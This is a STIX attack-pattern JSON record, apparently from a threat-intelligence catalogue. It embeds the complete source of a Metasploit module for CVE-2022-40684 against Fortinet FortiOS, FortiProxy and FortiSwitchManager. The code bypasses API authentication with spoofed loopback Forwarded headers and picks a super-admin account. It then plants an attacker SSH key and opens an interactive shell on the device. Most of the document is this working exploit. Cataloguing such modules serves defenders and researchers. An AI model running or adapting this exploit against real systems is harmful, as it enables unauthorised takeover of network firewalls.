{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--908d5558-6342-4791-b8fe-f66a6df0c67f",
    "created": "2024-08-14T17:01:50.320335Z",
    "modified": "2024-08-14T17:01:50.320339Z",
    "name": "Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.",
    "description": " This module exploits an authentication bypass vulnerability in the Fortinet FortiOS, FortiProxy, and FortiSwitchManager API to gain access to a chosen account. And then add a SSH key to the authorized_keys file of the chosen account, allowing to login to the system with the chosen account.  Successful exploitation results in remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/fortinet_authentication_bypass_cve_2022_40684.rb",
            "external_id": "fortinet_authentication_bypass_cve_2022_40684.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-40684"
        },
        {
            "source_name": "reference",
            "url": "https://www.fortiguard.com/psirt/FG-IR-22-377"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::SSH\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  attr_accessor :ssh_socket\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.',\n        'Description' => %q{\n          This module exploits an authentication bypass vulnerability\n          in the Fortinet FortiOS, FortiProxy, and FortiSwitchManager API\n          to gain access to a chosen account. And then add a SSH key to the\n          authorized_keys file of the chosen account, allowing\n          to login to the system with the chosen account.\n\n          Successful exploitation results in remote code execution.\n        },\n        'Author' => [\n          'Heyder Andrade <@HeyderAndrade>', # Metasploit module\n          'Zach Hanley <@hacks_zach>', # PoC\n        ],\n        'References' => [\n          ['CVE', '2022-40684'],\n          ['URL', 'https://www.fortiguard.com/psirt/FG-IR-22-377'],\n          ['URL', 'https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684'],\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2022-10-10', # Vendor advisory\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'FortiOS',\n            {\n              'DefaultOptions' => {\n                'PAYLOAD' => 'generic/ssh/interact'\n              },\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'ssh_interact'\n                }\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            IOC_IN_LOGS,\n            ARTIFACTS_ON_DISK # SSH key is added to authorized_keys file\n          ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the Fortinet CMDB API', '/api/v2/cmdb/']),\n        OptString.new('USERNAME', [false, 'Target username (Default: auto-detect)', nil]),\n        OptString.new('PRIVATE_KEY', [false, 'SSH private key file path', nil]),\n        OptString.new('KEY_PASS', [false, 'SSH private key password', nil]),\n        OptString.new('SSH_RPORT', [true, 'SSH port to connect to', 22]),\n        OptBool.new('PREFER_ADMIN', [false, 'Prefer to use the admin user if one is detected', true])\n      ]\n    )\n  end\n\n  def username\n    if datastore['USERNAME']\n      @username ||= datastore['USERNAME']\n    else\n      @username ||= detect_username\n    end\n  end\n\n  def ssh_rport\n    datastore['SSH_RPORT']\n  end\n\n  def current_keys\n    @current_keys ||= read_keys\n  end\n\n  def ssh_keygen\n    # ssh-keygen -t rsa -m PEM -f `openssl rand -hex 8`\n    if datastore['PRIVATE_KEY']\n      @ssh_keygen ||= Net::SSH::KeyFactory.load_data_private_key(\n        File.read(datastore['PRIVATE_KEY']),\n        datastore['KEY_PASS'],\n        datastore['PRIVATE_KEY']\n      )\n    else\n      @ssh_keygen ||= OpenSSL::PKey::EC.generate('prime256v1')\n    end\n  end\n\n  def ssh_private_key\n    ssh_keygen.to_pem\n  end\n\n  def ssh_pubkey\n    Rex::Text.encode_base64(ssh_keygen.public_key.to_blob)\n  end\n\n  def authorized_keys\n    pubkey = Rex::Text.encode_base64(ssh_keygen.public_key.to_blob)\n    \"#{ssh_keygen.ssh_type} #{pubkey} #{username}@localhost\"\n  end\n\n  def fortinet_request(params = {})\n    send_request_cgi(\n      {\n        'ctype' => 'application/json',\n        'agent' => 'Report Runner',\n        'headers' => {\n          'Forwarded' => \"for=\\\"[127.0.0.1]:#{rand(1024..65535)}\\\";by=\\\"[127.0.0.1]:#{rand(1024..65535)}\\\"\"\n        }\n      }.merge(params)\n    )\n  end\n\n  def check\n    vprint_status(\"Checking #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    # a normal request to the API should return a 401\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, Rex::Text.rand_text_alpha_lower(6)),\n      'ctype' => 'application/json'\n    })\n\n    return CheckCode::Unknown('Target did not respond to check.') unless res\n    return CheckCode::Safe('Target seems not affected by this vulnerability.') unless res.code == 401\n\n    # Trying to bypasss the authentication and get the sshkey from the current targeted user it should return a 200 if vulnerable\n    res = fortinet_request({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/system/status')\n    })\n\n    return CheckCode::Safe unless res&.code == 200\n\n    version = res.get_json_document['version']\n\n    print_good(\"Target is running the version #{version}, which is vulnerable.\")\n\n    Socket.tcp(rhost, ssh_rport, connect_timeout: datastore['SSH_TIMEOUT']) { |sock| return CheckCode::Safe('However SSH is not open, so adding a ssh key wouldn\\t give you access to the host.') unless sock }\n\n    CheckCode::Vulnerable('And SSH is running which makes it exploitable.')\n  end\n\n  def cleanup\n    return unless ssh_socket\n\n    # it assumes our key is the last one and set it to a random text. The API didn't respond to DELETE method\n    data = {\n      \"ssh-public-key#{current_keys.empty? ? '1' : current_keys.size}\" => '\"\"'\n    }\n\n    fortinet_request({\n      'method' => 'PUT',\n      'uri' => normalize_uri(target_uri.path, '/system/admin/', username),\n      'data' => data.to_json\n    })\n  end\n\n  def detect_username\n    vprint_status('User auto-detection...')\n    res = fortinet_request(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/system/admin')\n    )\n    users = res.get_json_document['results'].collect { |e| e['name'] if (e['accprofile'] == 'super_admin' && e['trusthost1'] == '0.0.0.0 0.0.0.0') }.compact\n    # we prefer to use admin, but if it doesn't exist we chose a random one.\n    if datastore['PREFER_ADMIN']\n      vprint_status(\"PREFER_ADMIN is #{datastore['PREFER_ADMIN']}, but if it isn't found we will pick a random one.\")\n      users.include?('admin') ? 'admin' : users.sample\n    else\n      vprint_status(\"PREFER_ADMIN is #{datastore['PREFER_ADMIN']}, we will get a random that is not the admin.\")\n      (users - ['admin']).sample\n    end\n  end\n\n  def add_ssh_key\n    if current_keys.include?(authorized_keys)\n      # then we'll remove that on cleanup\n      print_good('Your key is already in the authorized_keys file')\n      return\n    end\n    vprint_status('Adding SSH key to authorized_keys file')\n    # Adding the SSH key as the last entry in the authorized_keys file\n    keystoadd = current_keys.first(2) + [authorized_keys]\n    data = keystoadd.map.with_index { |key, idx| [\"ssh-public-key#{idx + 1}\", \"\\\"#{key}\\\"\"] }.to_h\n\n    res = fortinet_request({\n      'method' => 'PUT',\n      'uri' => normalize_uri(target_uri.path, '/system/admin/', username),\n      'data' => data.to_json\n    })\n    fail_with(Failure::UnexpectedReply, 'Failed to add SSH key to authorized_keys file.') unless res&.code == 500\n    body = res.get_json_document\n    fail_with(Failure::UnexpectedReply, 'Unexpected reponse from the server after adding the key.') unless body.key?('cli_error') && body['cli_error'] =~ /SSH key is good/\n  end\n\n  def read_keys\n    vprint_status('Reading SSH key from authorized_keys file')\n    res = fortinet_request({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/system/admin/', username)\n    })\n    fail_with(Failure::UnexpectedReply, 'Failed read current SSH keys') unless res&.code == 200\n    result = res.get_json_document['results'].first\n    ['ssh-public-key1', 'ssh-public-key2', 'ssh-public-key3'].map do |key|\n      result[key].gsub('\"', '') unless result[key].empty?\n    end.compact\n  end\n\n  def do_login(ssh_options)\n    # ensure we don't have a stale socket hanging around\n    ssh_options[:proxy].proxies = nil if ssh_options[:proxy]\n    begin\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        self.ssh_socket = Net::SSH.start(rhost, username, ssh_options)\n      end\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Disconnected during negotiation')\n    rescue Net::SSH::Disconnect, ::EOFError\n      fail_with(Failure::Disconnected, 'Timed out during negotiation')\n    rescue Net::SSH::AuthenticationFailed\n      fail_with(Failure::NoAccess, 'Failed authentication')\n    rescue Net::SSH::Exception => e\n      fail_with(Failure::Unknown, \"SSH Error: #{e.class} : #{e.message}\")\n    end\n\n    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless ssh_socket\n  end\n\n  def exploit\n    print_status(\"Executing exploit on #{datastore['RHOST']}:#{datastore['RPORT']} target user: #{username}\")\n    add_ssh_key\n    vprint_status('Establishing SSH connection')\n    ssh_options = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      key_data: [ ssh_private_key ],\n      port: ssh_rport\n    })\n    ssh_options.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    do_login(ssh_options)\n\n    handler(ssh_socket)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-10-10, # Vendor advisory",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}